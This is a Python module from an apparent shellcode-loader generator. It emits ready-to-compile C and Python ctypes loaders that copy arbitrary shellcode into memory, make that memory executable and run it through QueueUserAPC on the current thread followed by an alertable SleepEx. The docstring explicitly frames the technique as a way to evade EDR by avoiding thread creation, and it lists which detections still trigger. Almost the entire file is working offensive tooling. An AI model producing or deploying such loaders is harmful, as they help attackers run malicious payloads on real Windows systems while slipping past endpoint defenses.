"""Loader: win_apc_self — VirtualAlloc(RX) → memcpy → QueueUserAPC(self) → SleepEx(alertable).

Tier 2. Avoids CreateThread; executes shellcode via the APC (Asynchronous
Procedure Call) queue of the current thread.

Execution flow:
  1. Allocate RX memory, copy shellcode (two-stage: RW then VirtualProtect RX)
  2. QueueUserAPC(shellcode_ptr, GetCurrentThread(), 0)
     — enqueues shellcode as an APC on the calling thread
  3. SleepEx(0, TRUE) — alertable wait drains the APC queue and runs shellcode

Evasion property:
  - No CreateThread / NtCreateThreadEx in call graph
  - APC delivery is an in-process user-mode mechanism; no new thread visible
  - Legitimate use of SleepEx with alertable=TRUE is common (I/O completion ports)

Still triggers on:
  - QueueUserAPC with an address in anonymous memory (monitored by modern EDR)
  - VirtualProtect on anonymous memory to RX
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_apc_self")

_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>

{sc_array}

int main(void) {{
    LPVOID mem = VirtualAlloc(NULL, sc_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) {{
        fprintf(stderr, "[-] VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    DWORD old_protect;
    if (!VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old_protect)) {{
        fprintf(stderr, "[-] VirtualProtect failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    if (!QueueUserAPC((PAPCFUNC)mem, GetCurrentThread(), 0)) {{
        fprintf(stderr, "[-] QueueUserAPC failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    SleepEx(0, TRUE);

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import sys

{sc_bytes}

kernel32 = ctypes.windll.kernel32

mem = kernel32.VirtualAlloc(None, len(sc),
                            0x3000,   # MEM_COMMIT | MEM_RESERVE
                            0x04)     # PAGE_READWRITE
if not mem:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(sc))

old = ctypes.c_ulong(0)
if not kernel32.VirtualProtect(ctypes.c_void_p(mem), len(sc),
                                0x20,  # PAGE_EXECUTE_READ
                                ctypes.byref(old)):
    sys.exit(1)

APC_FUNC = ctypes.WINFUNCTYPE(None, ctypes.c_ulong_p if hasattr(ctypes, 'c_ulong_p') else ctypes.c_void_p)

current_thread = kernel32.GetCurrentThread()
if not kernel32.QueueUserAPC(ctypes.c_void_p(mem), ctypes.c_void_p(current_thread), 0):
    sys.exit(1)

kernel32.SleepEx(0, True)
"""


def generate_c(shellcode: bytes) -> str:
    """Return a compilable C loader using QueueUserAPC(self) + SleepEx(alertable)."""
    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))


def generate_python(shellcode: bytes) -> str:
    """Return a Python ctypes loader using QueueUserAPC self-injection."""
    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
